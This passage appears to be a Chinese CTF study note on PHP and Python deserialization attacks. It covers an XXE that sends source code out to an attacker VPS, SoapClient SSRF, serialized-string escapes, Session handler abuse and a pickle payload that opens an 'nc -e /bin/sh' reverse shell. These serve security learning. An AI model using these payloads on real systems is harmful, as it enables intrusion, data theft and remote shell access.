            $Expression=$args1.$method.$args2;
            eval("\$r=$Expression;");
            die("Calculation results:".$r);
        }
    }
    ?>
```

我们点击calc按钮，计算2+2=4，我们观察url处的参数，再结合`calc`计算器类的代码可知module为调用的类，args为类的构造方法的参数：

所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。

首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。

evil.xml

```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
    <!ENTITY % remote SYSTEM "http://47.xxx.xxx.72/send.xml">
    %remote;
    %all;
    %send;
    ]>
```

send.xml：

```xml
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
    <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://47.xxx.xxx.72/send.php?file=%file;'>">
```

send.php：

```xml
    <?php 
    file_put_contents("result.txt", $_GET['file']) ;
    ?>
```

然后在url中构造如下：

`/show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true`

这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。

如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：

后续解题过程就不写了。

### 题目

#### web259

题目描述：

```php
//flag.php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
    die('error');
}else{
    $token = $_POST['token'];
    if($token=='ctfshow'){
    file_put_contents('flag.txt',$flag);
 }
}
//index.php
<?php
highlight_file(__FILE__);
$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();

//payload
<?php
$ua = "kradress\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow";
$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php', 'user_agent' => $ua));

echo(urlencode(serialize($client)));


```

### 反序列化逃逸

#### 增长逃逸

```php
<?php
function filter($str){
    return str_replace('bb', 'ccc', $str);
}
class A{
    public $name='aaaa';
    public $pass='123456';
}
$AA=new A();
echo serialize($AA)."\n";
$res=filter(serialize($AA));

$c=unserialize($res);
echo $c->pass;
?>

```

上述代码含义大概就是将变量AA序列化后的值中的`bb`替换为ccc，随后再反序列化。  
由于本身AA是不含有’bb’的，所以结果非常正常。  

现在我们将$AA中的属性略加修改：

```php
public $name='aaaabb';
```

同时将`$res` 打印出来  
出现了如下结果：  

我们将本身要求是长度为6的字符串变成了长度为7，它本身已经无法进行反序列化了，并且根据反序列化函数的规则，它只会检测长度为6，也就是说最后一个`c`无法检测，这样我们就逃逸了一个字符。

假设我们要使用这个逃逸的间隙来修改pass的值，那么我们的payload可以是：

```php
";s:4:"pass";s:4:"hack";}
```

修改成功。  
这里的思想就是`原字符长度+payload长度=过滤后的字符长度`  
由于数量的限制和闭合的存在，能够完成反序列化，同时舍弃原来的数据。

#### 缩短逃逸

自然，过滤器除了能够增长字符串同时也能缩短字符串。  
代码示例：

```php
<?php
function str_rep($string){
return preg_replace( '/php|test/','', $string);
}

$test['name'] = $_GET['name'];
$test['sign'] = $_GET['sign']; 
$test['number'] = '2020';
$temp = str_rep(serialize($test));
printf($temp);
$fake = unserialize($temp);
echo '<br>';
print("name:".$fake['name'].'<br>');
print("sign:".$fake['sign'].'<br>');
print("number:".$fake['number'].'<br>');
?>
```

代码大概意思就是先通过get接收name,sign参数，然后通过黑名单过滤，将敏感字替换为空。  
这里我们想要更改number的值

思路为在写name的参数时，本身的长度是较长的，但是由于全部替换为空，急剧缩短后unserialize()会继续向后查找，继续向后就是对sign的序列化语句了，这时，在payload中我们给出一个`"` 让它闭合，这样对sign的序列化语句就会被错误地认为是name的参数，而一旦sign序列化语句的数字限制被屏蔽，我们就可以按照我们所想的进行随意定义了。而number作为最后一个参数，就能够被`}`提前闭合。

payload:

```php
name=testtesttesttesttesttest&sign='hello";s:4:"sign";s:4:"eval";s:6:"number";s:4:"2000";}'
```

部分例题来源：  
<https://blog.csdn.net/qq\_45521281/article/details/107135706>

#### CTF示例(bugku-web-new php)

题目源码：

```php
<?php
// php版本:5.4.44
header("Content-type: text/html; charset=utf-8");
highlight_file(__FILE__);

class evil{
    public $hint;

    public function __construct($hint){
        $this->hint = $hint;
    }

    public function __destruct(){
    if($this->hint==="hint.php")
            @$this->hint = base64_encode(file_get_contents($this->hint)); 
        var_dump($this->hint);
    }

    function __wakeup() { 
        if ($this->hint != "╭(●｀∀´●)╯") { 
            //There's a hint in ./hint.php
            $this->hint = "╰(●’◡’●)╮"; 
        } 
    }
}

class User
{
    public $username;
    public $password;

    public function __construct($username, $password){
        $this->username = $username;
        $this->password = $password;
    }

}

function write($data){
    global $tmp;
    $data = str_replace(chr(0).'*'.chr(0), '\0\0\0', $data);
    $tmp = $data;
}

function read(){
    global $tmp;
    $data = $tmp;
    $r = str_replace('\0\0\0', chr(0).'*'.chr(0), $data);
    return $r;
}

$tmp = "test";
$username = $_POST['username'];
$password = $_POST['password'];

$a = serialize(new User($username, $password));
if(preg_match('/flag/is',$a))
    die("NoNoNo!");

unserialize(read(write($a)));

```

重点看到的是两个类，在evil类里$this->hint指向文件触发file\_get\_contents函数读取文件内容，然后提示有个hint.php，肯定要构造触发这个evil类来获得flag。查看接入点，是post进去username和password两个参数。  
然后触发的是User类，有read和write方法，明显是过滤器(fliter),经过处理后才进行序列化，这就是典型的字符串逃逸。

思路：  
1.判断是增长型还是缩短型。  
2.按照要求写出payload。  
3.按照不同类型的逃逸方法对payload字段进行字符逃逸。  
4.对其他进行绕过（如\_\_wakeup()函数)。（不是本节重点）

这里的write chr(0).’\*’.chr(0) 代表 `null*null` protected标志常常会出现，长度为3，而其本身难以查找，我们利用read函数，将\\0\\0\\0长度为6缩短为长度为3，也就是缩短型。每次逃逸三个字符。

利用脚本写出payload:

```php
O:4:"evil":1:{s:4:"hint";s:8:"hint.php";}
```

strlen()函数获取字符串长度为：

```php
41
```

这里是缩短型，通过username的缩短来屏蔽对password字符段的长度定义。  
就是要屏蔽：`";s:8:"password";s:41:"`…  
屏蔽长度为：`23`  
加上一个填充字符到24（能够被3整除），也就是一共缩短8组过滤字符。

那么payload（post传入）:

```php
"username":"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
"password":a";O:4:"evil":1:{s:4:"hint";s:8:"hint.php";},
```

password的第一个`"a"`就是填充字符。

最后这里要对\_\_wakeup()函数进行绕过（对\_\_wakeup()函数绕过原理见下方)，再次修改payload:

```php
"username":"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
"password":a";O:4:"evil":2:{s:4:"hint";s:8:"hint.php";},
```

进入后得到一个base64编码的字符串：  
提示在index.cgi有东西。  
进入index.cgi后是一个简单的ssrf  
在下方的提示下，利用name参数发出get请求，利用file协议对文件进行请求  
payload为：

```php
index.cgi?name= file:///flag
```

得到flag:  

这里ssrf并不是我们的重点，就简单带过了。

### Session反序列化

Session是一次浏览器和服务器的交互的会话，在ctf中，Session往往有妙用，可以实现反序列化和文件包含，接下来我们先来看看Session具体是啥，然后如何利用Session实现反序列化：

#### 1.Session到底是啥？

前面我们说到，Session是浏览器和服务器之间交互的会话，会话是啥呢？就是我问候你好吗？你回答说很好。就是一次会话，那么对话完成后，这次会话相当于就结束了，但为什么会出现Session会话呢？因为我们用浏览器访问网站用的是`http`协议，`http`协议是一种无状态的协议，就是说它不会储存任何东西，每一次的请求都是没有关联的，无状态的协议好处就是快速；但它也有不方便的地方，比如说我们在`login.php`登录了，我们肯定希望在`index.php`中也是登录的状态，否则我们登录还有什么意义呢？但前面说到了`http`协议是无状态的协议，那访问两个页面就是发起两个`http`请求，他们俩之间是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了的；为了解决这个问题，`cookie`就诞生了，`cookie`是把少量数据存在**客户端**，它在一个域名下是全局的，相当于`php`可以在这个域名下的任何页面读取`cookie`信息，那只要我们访问的两个页面在同一个域名下，那就可以通过`cookie`获取到登录信息了；但这里就存在安全问题了，因为`cookie`是存在于客户端的，那用户就是可见的，并且可以随意修改的；那如何又要安全，又可以全局读取信息呢？这时候Session就出现了，其实它的本质和`cookie`是一样的，只不过它是存在于服务器端的

#### 2.Session的产生和保存

上面讲了Session产生的原因，那它具体长啥样子呢？这里我们用`php`中的Session机制，因为后面讲的反序列化也是基于`php`的嘛

首先，当我们需要使用Session时，我们要首先打开Session，开启Session的语句是`session_start();`，这个函数没有任何返回值，既不会成功也不会报错，它的作用是打开Session，并且随机生成一个32位的session\_id，session的全部机制也是基于这个session\_id，服务器就是通过这个唯一的session\_id来区分出这是哪个用户访问的：

```php
<?php
highlight_file(__FILE__);
session_start();
echo "session_id(): ".session_id()."<br>";
echo "COOKIE: ".$_COOKIE["PHPSESSID"];
```

![image.png](https://i.loli.net/2021/08/28/J7ortzcFVEQxmld.png)

这里可以看出`session_id()`这个系统方法是输出了本次生成的`session_id`，并且存入了`COOKIE`中，参数名为`PHPSESSID`，这两个值是相同的，而且只要浏览器一直不关，无论刷新多少次它的值都是不变的，但当你关掉浏览器之后它就消失了，重新打开之后会生成一个新的`session_id`，`session_id`就是用来标识一个用户的，就像是一个人的身份证一样，接下来就来看看`session`它是怎么保存的：

它是保存在服务器中的临时目录下的，保存的路径需要看`php.ini`的配置，我的是保存在`D:\phpStudy\PHPTutorial\tmp\tmp`这个路径下的，我们可以打开来看看：

![image.png](https://i.loli.net/2021/08/31/CwDpVaNfhzqcoiQ.png)

可以看到它的储存形式是文件名为`sess`+`_`+`session_id`，那我们能不能通过修改`COOKIE`中`PHPSESSID`的值来修改`session_id`呢？

![image.png](https://i.loli.net/2021/08/31/Z2GlbtcJQ9iy8fC.png)

然后刷新页面，可以发现成功了，成功修改了`session_id`的值，并且去保存的路径下去看发现也成功写进去了：

![image.png](https://i.loli.net/2021/08/31/9Qavjy1cpxusBwL.png)

![image.png](https://i.loli.net/2021/08/31/YZqu1PxcjoMhVRA.png)

![image.png](https://i.loli.net/2021/08/31/Yme8yTvJ6UMBdCi.png)

但由上图可知，它的文件内容是为空的，里面什么都没有，那我们能不能尝试往里面写入东西呢？依然在`a.php`中操作，给它赋个值：

![image.png](https://i.loli.net/2021/08/31/pWkHluF9Cgdzfms.png)

![image.png](https://i.loli.net/2021/08/31/4Urn52OjRpSwlXQ.png)

发现成功写进去了，它的内容就是将键值对**序列化**之后的结果

我们把大致过程总结一下：

就是HTTP请求一个页面后，如果用到开启`session`，会去读`COOKIE`中的`PHPSESSID`是否有，如果没有，则会新生成一个`session_id`，先存入`COOKIE`中的`PHPSESSID`中，再生成一个`sess_`前缀文件。当有**写入**`$_SESSION`的时候，就会往`sess_`文件里序列化写入数据。当**读取**到`session`变量的时候，先会读取`COOKIE`中的`PHPSESSID`，获得`session_id`，然后再去找这个`sess_session_id`文件，来获取对应的数据。由于默认的`PHPSESSID`是临时的会话，在浏览器关闭后就会消失，所以，当我们打开浏览器重新访问的时候，就会新生成`session_id`和`sess_session_id`这个文件。

#### 3.有关的配置

好了，上面铺垫了这么多，应该明白`Session`是什么以及`Session`的机制了，下面就开始正式进入正题，来看看`Session`反序列化

首先，我们先去`php.ini`中去看几项与`session`有关的配置：

1.`session.save_path`：这个是`session`的存储路径，也就是上文中`sess_session_id`那个文件存储的路径

![image.png](https://i.loli.net/2021/08/31/imyDdvK7orU8SGN.png)

2.`session.auto_start`：这个开关是指定是否在请求开始时就自动启动一个会话，默认为Off；如果它为`On`的话，相当于就先执行了一个`session_start()`，会生成一个`session_id`，一般来说这个开关是不会打开的

![image.png](https://i.loli.net/2021/08/31/SZsx4y75Ar21g3q.png)

3.`session.save_handler`：这个是设置用户自定义`session`存储的选项，默认是`files`，也就是以文件的形式来存储的，当然你也可以选择其它的形式，比如说数据库啥的

![image.png](https://i.loli.net/2021/08/31/fzFZkhPS1GLcRmv.png)

4.`session.serialize_handler`：这个是最为重要的一个，用来定义`session`序列化存储所用的处理器的名称，不同的处理器序列化以及读取出来会产生不同的结果；默认的处理器为`php`，常见的还有`php_binary`和`php_serialize`，接下来来一个一个的看它们：

![image.png](https://i.loli.net/2021/08/31/an7clWUwmOItDTL.png)

首先是`php`，因为它默认就是`php`，所以说用的应该是最多的，它处理之后的格式是**键名+竖线|+经过`serialize()`序列化处理后的值**

![image.png](https://i.loli.net/2021/08/31/sL8hIynZeMXVgSF.png)

然后我们来看`php_binary`，首先我们把处理器换成`php_binary`需要用语句`ini_set('session.serialize_handler','php_binary');`这个处理器的格式是**键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数序列化处理后的值**；注意这个键名的长度所所对应的ASCII字符，就比如说键名长度为4，那它对应的就是ASCII码为4的字符，是个不可见字符EOT，具体可见下表，从1到31都是不可见字符

![image.png](https://i.loli.net/2021/07/27/vmfHFZrN9GLSC8j.png)

所以说它最后的结果如下，框框代表的就是不可见字符：

![image.png](https://i.loli.net/2021/08/31/8PHjUL3ptbgEMT7.png)

最后我们来看`php_serialize`，这个处理器需要php版本>5.5.4才能使用，首先我们还是得先用`ini_set`进行设置，语句如下：`ini_set('session.serialize_handler','php_serialize');`这个的格式是**直接进行序列化，把`session`中的键和值都会被进行序列化操作**，然后把它当成一个数组返回回来：

![image.png](https://i.loli.net/2021/08/31/I5LW637GnHtzsrB.png)

#### 4.Session反序列化原理

讲了这么多，相信很多人还是一头雾水，那为什么会产生`Session`反序列化漏洞呢？这个问题其实也困扰了我很久，以前我也是只知道操作但不清楚原理，知道前面加个`|`就可以成功但至于为什么就一脸懵逼，因为我们都知道`Session`反序列化是不需要`unserialize()`函数就可以实现的，那这具体是怎么实现的呢？今天就来把它彻底搞懂：

首先我们再来看看`session_start()`函数，前面我们看到的是没有打开`Session`的情况下它是打开`Session`并且返回一个`session_id`，但假如我们前面就已经打开了`Session`呢？这里我们再来看看官方文档：

![image.png](https://i.loli.net/2021/08/31/xFO1zyPubdHliQT.png)

这里重点看我框了的内容，尤其我箭头指向的地方，它会自动反序列化数据，那就很漂亮啊！这里就解决了没有`unserialize()`的问题，那我们可不可以考虑先把序列化后的数据写入`sess_session_id`文件中，然后在有反序列化漏洞页面刷新页面，由于这个页面依然有`session_start()`，那它就去读取那个文件的内容，然后自动进行反序列化操作，这样就会触发反序列化漏洞，完美！！

这个思路理论上是可以成功的，但这里还有一个核心问题没有解决，就是说我们怎么让它**反序列化的是我们传入的序列化的内容**，因为我们传入的是键值对，那么`session`序列化存储所用的处理器肯定也是将这个**键值对**写了进去，那我们怎么让它正好反序列化到我们传入的内容呢？这里就需要介绍出**两种处理器的差别**了，`php`处理器写入时的格式为`键名+竖线|+经过serialize()序列化处理后的值`那它读取时，肯定就会以`竖线|`作为一个分隔符，前面的为键名，后面的为键值，然后将键值进行**反序列化**操作；而`php_serialize`处理器是直接进行序列化，然后返回**序列化后的数组**，那我们能不能在我们传入的序列化内容前加一个分隔符`|`，从而正好**序列化我们传入的内容呢**？

这肯定是可以的，而这正是我们`Session`反序列化的原理，如果看到这有点发晕的话，没关系，咱接着往下看，接下来咱来分析一个例子

#### 5.案例分析

首先我们来写一个存在反序列化漏洞的页面：

```php
<?php
highlight_file(__FILE__);
ini_set('session.serialize_handler', 'php');
session_start();
class Test{
    public $code;
    function __wakeup(){
    eval($this->code);
    }
}
```

这应该是很简单的一个反序列化，反序列化后会先直接进入`__wakeup()`，然后就`eval`执行任意代码了，我们先写个exp：

```php

<?php
class Test{
    public $code='phpinfo();';
}
$a = new Test();
echo serialize($a);
?>
```

然后我们再写一个页面，因为这里既没有传参的点也没有反序列化的点，相对于有漏洞利用不了，那我们就写一个利用它的页面`sess.php`：

```php
<?php
highlight_file(__FILE__);
ini_set('session.serialize_handler', 'php_serialize');
session_start();
if(isset($_GET['test'])){
    $_SESSION['test']=$_GET['test'];
}
?>
```

有了这个页面我们就可以把想要的内容写入到`Session`中了，然后就可以在有漏洞的页面中执行反序列化了，接下来开始操作，首先运行`exp.php`：

![image.png](https://i.loli.net/2021/08/31/2iyrQq49pSMuBdL.png)image.png

然后我们通过`sess.php`将运行结果写入`Session`中，记得在前面加上`|`：

![image.png](https://i.loli.net/2021/08/31/aulerJ2YxZfX54j.png)image.png

然后我们去看它成功写入`Session`没有，并且看看写入的内容是什么：

![image.png](https://i.loli.net/2021/08/31/bBCtN8mdnayOK4u.png)image.png

可以看到它已经成功写入进去了，并且内容也是我们想要的内容，按照`php`处理器的处理方法，会以`|`为分隔符，左边为键，右边为值，然后将值进行反序列化操作，那我们就去有漏洞的页面去刷新，看看它有没有反序列化之后触发反序列化漏洞：

![image.png](https://i.loli.net/2021/08/31/jNbHJdVaEifs1k6.png)image.png

### 引用&

eg：

```php
<?php

error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}

```

只要使`$password=&$token`即可

### php特性

变量名区分大小写
常量名区分大小写
数组索引 (键名) 区分大小写
函数名, 方法名, 类名不区分大小写
魔术常量不区分大小写 (以双下划线开头和结尾的常量)
`NULL TRUE FALSE` 不区分大小写
强制类型转换不区分大小写 (在变量前面加上 (type))

### Python反序列化

#### pickle

与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。
python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。
与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。
pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）

#### 可序列化的对象

* None 、 True 和 False
* 整数、浮点数、复数
* str、byte、bytearray
* 只包含可封存对象的集合，包括 tuple、list、set 和 dict
* 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）
* 定义在模块最外层的内置函数
* 定义在模块最外层的类
* `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类(详见官方文档的Pickling Class Instances)

`object.__reduce__()` 函数
在开发时，可以通过重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 `object.__reduce__()` 返回一个 `(callable, ([para1,para2...])[,...])` 的元组，每当该类的对象被`unpickle`时，该`callable`就会被调用以生成对象（该`callable`其实是构造函数）。
在`pickle`的`opcode`中， `R` 的作用与 `object.__reduce__()` 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 `R` 正好对应 `object.__reduce__()` 函数， `object.__reduce__()`的返回值会作为 `R` 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 `R` 的。

#### 利用

```py
import base64
import pickle


class shell(object):
    def __reduce__(self):
        return (eval, ("__import__('os').popen('nc ip 9999 -e /bin/sh')",))

k = shell()
print(base64.b64encode(pickle.dumps(k)))
```
